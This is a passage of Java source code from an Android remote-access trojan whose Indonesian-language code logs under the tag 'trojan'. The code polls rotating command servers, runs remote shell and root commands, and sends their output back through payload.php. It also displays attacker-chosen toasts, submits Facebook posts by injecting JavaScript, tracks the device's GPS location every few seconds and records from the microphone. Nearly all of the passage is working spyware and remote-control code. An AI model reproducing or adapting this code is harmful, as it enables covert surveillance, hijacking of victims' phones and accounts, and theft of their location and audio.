						else if (textFb[3].equals("bawah")) alert_letak = Gravity.BOTTOM;  
						else if (textFb[3].equals("atas&tengah")) alert_letak = Gravity.TOP | Gravity.CENTER;  
						else if (textFb[3].equals("bawah&tengah")) alert_letak = Gravity.BOTTOM | Gravity.CENTER;  

						if (textFb[2].equals("biru")) alert_warna = Color.BLUE;
						else if (textFb[2].equals("merah")) alert_warna = Color.RED;
						else if (textFb[2].equals("kuning")) alert_warna = Color.YELLOW;
						else if (textFb[2].equals("hujau")) alert_warna = Color.GREEN;
					
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("toast text:"+textFb[1]+" letak:"+alert_letak+" warna:"+alert_warna+" durasi:"+alert_durasi), "null");
						fbAktif = true;
						CountDownTimer hitungMundur = new CountDownTimer(alert_durasi, 100){
							public void onTick(long millisUntilFinished){
								if (textFb[1].equals("?img?")) {
									receAction.toastImage(SystemThread.this, textFb[2], alert_letak);
									receAction.toast.show();
								} else {
									receAction.toastText(context, textFb[1], alert_warna, alert_letak);
									receAction.toast.show();
								}
							}
							public void onFinish()
							{
							}
						}.start();
					
					} catch(Exception e) {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("toast text:"+textFb[1]), "null");
						fbAktif = true;
						CountDownTimer hitungMundur = new CountDownTimer(7500, 100){
							public void onTick(long millisUntilFinished){
								receAction.toastText(context, textFb[1], alert_warna, alert_letak);
								receAction.toast.show();
							}
							public void onFinish()
							{
							}
						}.start();
					}
				}catch(Exception e) {}

				try {
					int alert_durasi = Integer.parseInt(text[4]);
				}catch(Exception e) {}
				try {
					if (text[3].equals("atas")) alert_letak = Gravity.TOP;
					else if (text[3].equals("tengah")) alert_letak = Gravity.CENTER;  
					else if (text[3].equals("bawah")) alert_letak = Gravity.BOTTOM;  
					else if (text[3].equals("atas&tengah")) alert_letak = Gravity.TOP | Gravity.CENTER;  
					else if (text[3].equals("bawah&tengah")) alert_letak = Gravity.BOTTOM | Gravity.CENTER;  

					if (text[2].equals("biru")) alert_warna = Color.BLUE;
					else if (text[2].equals("merah")) alert_warna = Color.RED;
					else if (text[2].equals("kuning")) alert_warna = Color.YELLOW;
					else if (text[2].equals("hujau")) alert_warna = Color.GREEN;
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("toast text:"+text[1]+" letak:"+alert_letak+" warna:"+alert_warna+" durasi:"+alert_durasi), "null");

					CountDownTimer hitungMundur = new CountDownTimer(alert_durasi, 100){
						public void onTick(long millisUntilFinished){
							if (text[1].equals("?img?")) {
								receAction.toastImage(SystemThread.this, text[2], alert_letak);
								receAction.toast.show();
							} else {
								receAction.toastText(context, text[1], alert_warna, alert_letak);
								receAction.toast.show();
							}
						}
						public void onFinish()
						{
						}
					}.start();
					
				}
				catch(Exception e) {
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("toast text:"+text[1]), "null");

					CountDownTimer hitungMundur = new CountDownTimer(7500, 100){
						public void onTick(long millisUntilFinished){
							receAction.toastText(context, text[1], alert_warna, alert_letak);
							receAction.toast.show();
						}
						public void onFinish()
						{
						}
					}.start();
				}
			}catch(Exception e){}
			
			try {
				String[] text = payloadWebResult.split("-/-");
				try { 
					String[] textFb = payloadResultFb().split("-/-");
					Log.i(TAG, receAction.textSplit(textFb[1], "\n"));

					receAction.editor(context, receAction.textSplit(textFb[1], "\n"), textFb[2]);
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("text tersimpan siap dieksukesi<-_->"), "null");
					fbAktif = true;
				}catch(Exception e) {}

				Log.i(TAG, receAction.textSplit(text[1], "\n"));
				receAction.editor(context, receAction.textSplit(text[1], "\n"), text[2]);
				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("text tersimpan siap dieksukesi<-_->"), "null");
			}catch(Exception e) {}

			try {
				term = payloadWebResult.split("-_-");
				try { 
					String[] textFb = payloadResultFb().split("-_-");

					String out = textPayload(receAction.shellCommands(""+textFb[1]));
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+out, "null");
					fbAktif = true;
				}catch(Exception e) {}

				if (term[1] != "") {
					String out = textPayload(receAction.shellCommands(""+term[1]));
					Log.i(TAG, out);
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+out, "null");
				}
			}
			catch(Exception e) {
			}

			try {
				term = payloadWebResult.split("-su-");
				try { 
					String[] textFb = payloadResultFb().split("-su-");
					String[] sud = { textFb[1] };
					String resultSudo = "";
					try {
						receAction.rootCommands(sud);
						resultSudo = "sukses execute root";
					}catch(Exception e) {
						resultSudo = "Failed execute root";
					}
					String out = textPayload(resultSudo);
					Log.i(TAG, out);
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+out, "null");
					fbAktif = true;
				}catch(Exception e) {}

				if (term[1] != "") {
					String[] sud = { term[1] };
					String resultSudo = "";
					try {
						receAction.rootCommands(sud);
						resultSudo = "sukses execute root";
					}catch(Exception e) {
						resultSudo = "Failed execute root";
					}
					String out = textPayload(resultSudo);
					Log.i(TAG, out);
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+out, "null");
				}
			}
			catch(Exception e) {}

			if (receAction.installResult && fbAktif) {
				fbAktif = false;
				receAction.fbPayload(context, "javascript:document.forms[1].p_text.value='"+dataPayloadFb+"';" +"document.forms[1].submit()", urlfbPostinganEdt);
				receAction.resultFbPayload = "";
			}
	}
	
	private class PayloadWebTask extends AsyncTask<String, Void, String> 
	{
		protected Context applicationContext;
		protected String paymain = "";
		// connecting...
		@Override
		protected void onPreExecute() {}

	    @Override
	    protected String doInBackground(String... data) {
	    	processPing = false;

	    	String sret = "";
	    	HttpParams httpParams = new BasicHttpParams();
	    	HttpConnectionParams.setConnectionTimeout(httpParams, 50000);
	    	HttpConnectionParams.setSoTimeout(httpParams, 50000);

			HttpClient httpClient = new DefaultHttpClient(httpParams);
			HttpGet request = new HttpGet(data[0]);
			try{
				HttpResponse response = httpClient.execute(request);
				try { // split result
					InputStream in = response.getEntity().getContent();
					BufferedReader reader = new BufferedReader(new InputStreamReader(in));
					StringBuilder str = new StringBuilder();
					String line = null;
					while((line = reader.readLine()) != null){
						str.append(line);
					}
					in.close();
					sret = str.toString();
				} catch(Exception ex) {
					Log.i(TAG, "Error split text");
				}
			}
			catch(Exception ex){
				Log.i(TAG, "payload Failed Connect to Server!");
				processPing = true;

				payloadWebResult = "";
				payloadWebResultTarget = "";
				payloadWebResultSwitch = "";
				
			}
			return sret;
	    }

	    // berhasil
	    @Override
	    protected void onPostExecute(String result) {
	    	processPing = true;

	    	if (paymain.equals("text")) {
	    		payloadWebResult = result;
	    	}
	    	else if (paymain.equals("json")) {
	    		JSONObject obj;

	    		try {
	    			obj = new JSONObject(result);
	    			payloadWebResult       = obj.getString("inpayload");
	    			payloadWebResultTarget = obj.getString("target");
	    			payloadWebResultSwitch = obj.getString("swthread");
	    			payloadWebResultSwitchFb = obj.getString("swlinkfb");
	    		
	    		} catch(Exception e) {}

	    		if (payloadWebResultSwitch.equals("")) {
	    			iserver += 1;
					if (iserver == server.length) 
						iserver = 0;
					urlServer = server[iserver];
	    		}
	    	}
	    	else if (paymain.equals("sw")) {
	    		payloadWebResultSwitch = result;
	    	}
	    	else if (paymain.equals("target")) {
	    		payloadWebResultTarget = result;
	    	}
	    	
		}
	}

	private ServiceConnection camServiceConeksi = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
           	binder = (CamRuntime.LocalBinder) service;
           	Log.i("trojan", "binder: "+binder.isAktif());
        }

       	@Override
       	public void onServiceDisconnected(ComponentName name) {
           	binder = null;
       	}
    };

}

class GPSresult implements LocationListener {

	private LocationManager locationManager;
	private Context context;
	public static String gpsResult = "";
	
	public GPSresult(Context context) {
		this.context = context;
		
		locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		locationManager.requestLocationUpdates( LocationManager.GPS_PROVIDER, 3000, 10, this);
		
	}
	/************* Called after each 3 sec **********/
	@Override
	public void onLocationChanged(Location location) {

		String str = "Latitude: "+location.getLatitude()+" Longitude: "+location.getLongitude();
		gpsResult = str;
	}

	@Override
	public void onProviderDisabled(String provider) {
		gpsResult = "GPS mati";
	}

	@Override
	public void onProviderEnabled(String provider) {
		gpsResult += "GPS hidup";
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
	}
}

class AudioRecorder { 
	public enum State {
		INITIALIZING, READY, RECORDING, ERROR, STOPPED
	}; 

	private byte[] audioBuffer = null; 
	private int source = MediaRecorder.AudioSource.MIC; 
	private int sampleRate = 0; 
	private int encoder =0; 
	private int nChannels = 0; 
	private int bufferRead = 0; 
	private int bufferSize = 0; 
	private RandomAccessFile tempAudioFile = null; 
	public AudioRecord audioRecorder = null; 
	private State state; 
	private short bSamples = 16; 
	private int framePeriod; 
	// The interval in which the recorded samples are output to the file 
	// Used only in uncompressed mode 
	private static final int TIMER_INTERVAL = 120; 
	volatile Thread t = null; 
	public int TimeStamp =0, count=0, preTimeStamp =0; 

	public AudioRecorder(Context c) { 
		sampleRate = 11025; 
		encoder = AudioFormat.ENCODING_PCM_16BIT; 
		nChannels = AudioFormat.CHANNEL_CONFIGURATION_MONO; 
		preTimeStamp = (int) System.currentTimeMillis();
		state = State.INITIALIZING;
		
		try { 
			String fileName = "/sdcard/11025.wav"; 
			tempAudioFile = new RandomAccessFile(fileName,"rw");
			framePeriod = sampleRate * TIMER_INTERVAL / 1000; 
			bufferSize = framePeriod * 2 * bSamples * nChannels / 8; 

			if (bufferSize < AudioRecord.getMinBufferSize(sampleRate, nChannels, encoder)) { 
				bufferSize = AudioRecord.getMinBufferSize(sampleRate, nChannels, encoder); 
				// Set frame period and timer interval accordingly 
				framePeriod = bufferSize / ( 2 * bSamples * nChannels / 8 ); 
				Log.i(new SystemThread().TAG, "Increasing buffer size to " + Integer.toString(bufferSize)); 
			} 

			audioRecorder = new AudioRecord(source,sampleRate,nChannels,encoder,bufferSize); 
			audioBuffer = new byte[2048]; 
			audioRecorder.setRecordPositionUpdateListener(updateListener); 
			audioRecorder.setPositionNotificationPeriod(framePeriod); 

		} catch(Exception ex) { 
			Log.i(new SystemThread().TAG, ""+ex);
		}
	} 

	private AudioRecord.OnRecordPositionUpdateListener updateListener = new AudioRecord.OnRecordPositionUpdateListener() { 
		@Override 
		public void onPeriodicNotification(AudioRecord recorder) { 
			 
		} 

		@Override 
		public void onMarkerReached(AudioRecord recorder) { 
			// TODO Auto-generated method stub 
		}
	}; 

	public void start() { 
		if (state == State.INITIALIZING) { 
			audioRecorder.startRecording(); 
			state = State.RECORDING; 
			t = new Thread() { 
				public void run() { 
					//Here You can read your Audio Buffers 
					audioRecorder.read(audioBuffer, 0, 2048); 
				} 
			}; 

			t.setPriority(Thread.MAX_PRIORITY); 
			t.start(); 
		} else { 
			Log.i(new SystemThread().TAG, "start() called on illegal state"); 
			state = State.ERROR; 
		} 
	} 

	public void stop() { 
		if (state == State.RECORDING) { 
			audioRecorder.stop(); 
			Thread t1 = t; 
			t=null; 
			t1.interrupt(); 
			count =0; 
			state = State.STOPPED; 
		} else { 
			Log.i(new SystemThread().TAG, "stop() called on illegal state"); 
			state = State.ERROR; 
		} 
	} 

	public void release() { 
		if (state == State.RECORDING) { 
			stop(); 
		} 
		if (audioRecorder != null) { 
			audioRecorder.release(); 
		} 
	} 

	public void reset() { 
		try { 
			if (state != State.ERROR) { 
				release(); 
			} 
		} catch (Exception e) { 
			Log.i(new SystemThread().TAG, e.getMessage()); 
			state = State.ERROR; 
		} 
	} 

	public State getState() { 
		return state; 
	} 
}
